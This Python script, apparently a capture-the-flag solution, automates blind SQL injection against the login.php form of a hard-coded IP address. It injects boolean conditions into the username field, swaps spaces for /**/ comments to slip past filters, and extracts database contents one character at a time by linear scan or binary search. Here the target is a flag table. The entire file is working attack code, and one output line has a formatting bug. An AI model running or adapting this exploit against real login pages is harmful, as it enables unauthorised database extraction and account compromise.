import requests
import string
import sys
import threading

# session = requests.Session()

# url = "http://202.112.47.60:8001/"

class BaseSqlHelper:
    def __init__(self,host:str) -> None:
        self.host=host
        self.pt = string.printable
        pass
    
    def hack(self,payload:str)->bool:
        paramPost={'password':'eki','username':f"'eki' or ({payload})#".replace(" ","/**/")}
        headers={"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15",
                "Connection":"close",
                "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type":"application/x-www-form-urlencoded"
                }
        res=requests.post(self.host+"/login.php",data=paramPost,headers=headers)
        
        if b"password error" in res.content:
            return True
        else:
            return False
        
    def equBlide(self,sql:str)->None:
        ret=""
        i=1
        while True:
            flag=0
            for ch in self.pt:
                payload=f'((ascii(substr(hex(({sql})),{i},1)))={ord(ch)})'
                sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret+ch))
                sys.stdout.flush()
                if self.hack(payload):
                    ret=ret+ch
                    sys.stdout.write("{0} [-] Result : -> {1} <-\r").format(threading.current_thread().name,ret)
                    sys.stdout.flush()
                    flag=1
                    break
            if flag==0:
                break
            i+=1
        sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")
        
    def efBlind(self,sql:str)->None:
        ret=""
        i=1
        while True:
            l=20
            r=130
            while(l+1<r):
                mid=(l+r)//2
                payload=f"if((ascii(substr(({sql}),{i},1)))>{mid},1,0)"
                if self.hack(payload):
                    l=mid
                else:
                    r=mid
            if (chr(r)not in self.pt):
                break
            i+=1
            ret=ret+chr(r)
            sys.stdout.write("[-]{0} Result : -> {1} <-\r".format(threading.current_thread().name,ret))
            sys.stdout.flush()
        sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")
    
if __name__=='__main__':
    host="http://202.112.47.60:8001/"
    sqlExp=BaseSqlHelper(host=host)
    # sql="database()"
    sql="table f11114g limit 1,1"
    sqlExp.equBlide(sql)
    

    